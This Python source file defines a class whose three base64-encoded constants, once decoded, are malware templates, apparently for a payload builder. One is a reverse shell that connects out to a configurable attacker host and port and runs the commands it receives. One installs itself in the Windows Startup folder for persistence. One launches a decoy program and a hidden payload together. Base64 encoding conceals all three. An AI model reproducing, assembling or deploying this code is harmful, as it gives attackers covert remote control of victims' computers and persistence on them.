class EncodeBase:
    PAYLOAD_TYPE_SHELL = "aW1wb3J0IHNvY2tldAppbXBvcnQgc3VicHJvY2VzcwoKCmNsYXNzIENsaWVudDoKICAgIGRlZiBfX2luaXRfXyhzZWxmLCBob3N0LCBwb3J0KToKICAgICAgICBzZWxmLmhvc3QgPSBob3N0CiAgICAgICAgc2VsZi5wb3J0ID0gcG9ydAogICAgICAgIHNlbGYuY2xpZW50ID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKQogICAgICAgIHNlbGYuY2xpZW50LmNvbm5lY3QoKHNlbGYuaG9zdCwgc2VsZi5wb3J0KSkKCiAgICBkZWYgc2VuZChzZWxmOiBpc2luc3RhbmNlLCBkYXRhOiBieXRlcyk6CiAgICAgICAgc2VsZi5jbGllbnQuc2VuZChkYXRhKQoKICAgIGRlZiByZWNlaXZlKHNlbGYpOgogICAgICAgIHJldHVybiBzZWxmLmNsaWVudC5yZWN2KDYwMDApCgoKY2xpZW50ID0gTm9uZQpkZWYgY29ubmVjdCgpOgogICAgZ2xvYmFsIGNsaWVudAogICAgd2hpbGUgY2xpZW50IGlzIE5vbmU6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBjbGllbnQgPSBDbGllbnQoJHtMSE9TVH0sICR7TFBPUlR9KQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgIHBhc3MKCgpjb25uZWN0KCkKCndoaWxlIFRydWU6CiAgICB0cnk6CiAgICAgICAgY29tbWFuZCA9IGNsaWVudC5yZWNlaXZlKCkuZGVjb2RlKCkKICAgICAgICBpZiBjb21tYW5kIGlzIE5vbmU6CiAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgb3V0cHV0ID0gc3VicHJvY2Vzcy5ydW4oCiAgICAgICAgICAgIGNvbW1hbmQsCiAgICAgICAgICAgIHNoZWxsPVRydWUsCiAgICAgICAgICAgIHRleHQ9VHJ1ZSwKICAgICAgICAgICAgY2FwdHVyZV9vdXRwdXQ9VHJ1ZSwKICAgICAgICApCiAgICAgICAgb3V0cHV0ID0gb3V0cHV0LnN0ZGVyciBpZiBvdXRwdXQuc3RkZXJyIGVsc2Ugb3V0cHV0LnN0ZG91dAoKICAgICAgICBpZiBvdXRwdXQgaXMgTm9uZSBvciBvdXRwdXQgPT0gIiI6CiAgICAgICAgICAgIG91dHB1dCA9ICJDb21tYW5kIGV4ZWN1dGVkIHN1Y2Nlc3NmdWxseSIKCiAgICAgICAgY2xpZW50LnNlbmQob3V0cHV0LmVuY29kZSgpKQogICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICBjbGllbnQgPSBOb25lCiAgICAgICAgY29ubmVjdCgpCiAgICAgICAgcGFzcwo="

    AUTOEXEC_PAYLOAD = "aW1wb3J0IHNodXRpbAppbXBvcnQgb3MKaW1wb3J0IHN5cwppbXBvcnQgc3VicHJvY2VzcwoKbGF1bmNoID0gVHJ1ZQoKd2hpbGUgbGF1bmNoOgogICAgdHJ5OgogICAgICAgIG9zLmNoZGlyKHN5cy5fTUVJUEFTUykKCiAgICAgICAgaWYgaGFzYXR0cihzeXMsICJfTUVJUEFTUyIpOgogICAgICAgICAgICBzb3VyY2VfZmlsZSA9IG9zLnBhdGguam9pbihzeXMuX01FSVBBU1MsICIke3dpbmRvd3MuYXV0b2V4ZS5wYXRofSIpCgogICAgICAgIGFwcGRhdGEgPSBvcy5nZXRlbnYoIkFQUERBVEEiKQogICAgICAgIHBhdGggPSBvcy5wYXRoLmpvaW4oCiAgICAgICAgICAgIGFwcGRhdGEsCiAgICAgICAgICAgICJNaWNyb3NvZnQiLAogICAgICAgICAgICAiV2luZG93cyIsCiAgICAgICAgICAgICJTdGFydCBNZW51IiwKICAgICAgICAgICAgIlByb2dyYW1zIiwKICAgICAgICAgICAgIlN0YXJ0dXAiLAogICAgICAgICAgICAiJHt3aW5kb3dzLmF1dG9leGUucGF0aH0iLAogICAgICAgICkKICAgICAgICBzaHV0aWwuY29weWZpbGUoc291cmNlX2ZpbGUsIHBhdGgpCiAgICAgICAgc3VicHJvY2Vzcy5ydW4oW3BhdGhdLCBjcmVhdGlvbmZsYWdzPXN1YnByb2Nlc3MuQ1JFQVRFX05PX1dJTkRPVykKICAgICAgICBsYXVuY2ggPSBGYWxzZQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIGxhdW5jaCA9IFRydWUKICAgICAgICBjb250aW51ZQoKCg=="

    HIDDEN_EXE = "aW1wb3J0IG9zCmltcG9ydCBzeXMKaW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IHRocmVhZGluZwoKbGF1bmNoID0gVHJ1ZQoKd2hpbGUgbGF1bmNoOgogICAgdHJ5OgogICAgICAgIGZvbGRlcl9hcHAgPSBvcy5wYXRoLmpvaW4oc3lzLl9NRUlQQVNTKSBpZiBoYXNhdHRyKHN5cywgIl9NRUlQQVNTIikgZWxzZSBOb25lCgogICAgICAgIGlmIGZvbGRlcl9hcHAgaXMgTm9uZTogY29udGludWUKCiAgICAgICAgZXhlY3V0YWJsZV9hcHAgPSBvcy5wYXRoLmpvaW4oZm9sZGVyX2FwcCwgIiR7d2luZG93cy5oaWRkZW5leGUubmFtZV9hcHB9IikKICAgICAgICBleGVjdXRhYmxlX3BheWxvYWQgPSBvcy5wYXRoLmpvaW4oCiAgICAgICAgICAgIGZvbGRlcl9hcHAsICIke3dpbmRvd3MuaGlkZGVuZXhlLm5hbWVfcGF5bG9hZH0iCiAgICAgICAgKQoKICAgICAgICB0aHJlYWRzID0gW10KICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhleGVjdXRhYmxlX2FwcCk6CiAgICAgICAgICAgIHRocmVhZF9hcHAgPSB0aHJlYWRpbmcuVGhyZWFkKAogICAgICAgICAgICAgICAgdGFyZ2V0PXN1YnByb2Nlc3MucnVuLAogICAgICAgICAgICAgICAgYXJncz1bZXhlY3V0YWJsZV9hcHBdLAogICAgICAgICAgICAgICAga3dhcmdzPXsiY3JlYXRpb25mbGFncyI6IHN1YnByb2Nlc3MuQ1JFQVRFX05PX1dJTkRPV30sCiAgICAgICAgICAgICkKICAgICAgICAgICAgdGhyZWFkcy5hcHBlbmQodGhyZWFkX2FwcCkKICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhleGVjdXRhYmxlX3BheWxvYWQpOgogICAgICAgICAgICB0aHJlYWRfcGF5bG9hZCA9IHRocmVhZGluZy5UaHJlYWQoCiAgICAgICAgICAgICAgICB0YXJnZXQ9c3VicHJvY2Vzcy5ydW4sCiAgICAgICAgICAgICAgICBhcmdzPVtleGVjdXRhYmxlX3BheWxvYWRdLAogICAgICAgICAgICAgICAga3dhcmdzPXsiY3JlYXRpb25mbGFncyI6IHN1YnByb2Nlc3MuQ1JFQVRFX05PX1dJTkRPV30sCiAgICAgICAgICAgICkKICAgICAgICAgICAgdGhyZWFkcy5hcHBlbmQodGhyZWFkX3BheWxvYWQpCgogICAgICAgIGZvciB0aHJlYWQgaW4gdGhyZWFkczogdGhyZWFkLnN0YXJ0KCkKICAgICAgICBsYXVuY2ggPSBGYWxzZQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIGxhdW5jaCA9IFRydWUK"
